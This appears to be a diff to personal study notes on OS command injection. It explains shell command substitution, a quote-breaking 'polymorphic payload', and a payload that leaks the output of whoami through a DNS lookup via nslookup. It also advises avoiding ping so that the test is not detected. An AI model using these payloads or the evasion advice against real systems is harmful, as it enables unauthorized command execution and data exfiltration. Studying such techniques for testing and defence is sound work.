@@ -17,4 +17,37 @@ In this attack, the attacker-supplied operating system commands are usually exec
 > 			start end
 > ````
 
-#security/web 
+> [!important] Command Injection appearance
+> This vulnerability usually only appears if you have a need for running commands on the OS
+
+> [!important] Substitution command
+> Earlier example with `;` usually can get stuck when input is validated
+> Use Substitution command trick in Linux:
+> 
+> ```bash
+> echo MY NAME IS "FIRSTNAME $(echo TEST) LASTNAME"
+> > MY NAME IS FIRSTNAME TEST LASTNAME 
+> ```
+
+> [!attention] Pay attention to quotation `""`
+> Single Quotation does not work
+> ```bash
+> echo MY NAME IS 'FIRSTNAME $(echo TEST) LASTNAME'
+> > MY NAME IS FIRSTNAME $(echo TEST) LASTNAME
+> ```
+> **This WORKS!** and it is called Polymorphic Payloads
+> ```bash
+> echo MY NAME IS 'FIRSTNAME '$(echo TEST)' LASTNAME '
+> ```
+
+After finding out this vulnerability, you have to test to confirm.
+DO NOT test with ping as it will be caught. Use a command that both Linux and Windows have.
+Such as [[Linux/Commands/Networking/nslookup|nslookup]]
+
+Below command would find the result of `whoami` command and it would make a request to that subdomain of google.com. 
+
+```bash
+echo MY NAME IS 'FIRSTNAME '$(nslookup $(whoami).google.com)' LASTNAME'
+```
+
+Therefore you would find the current user
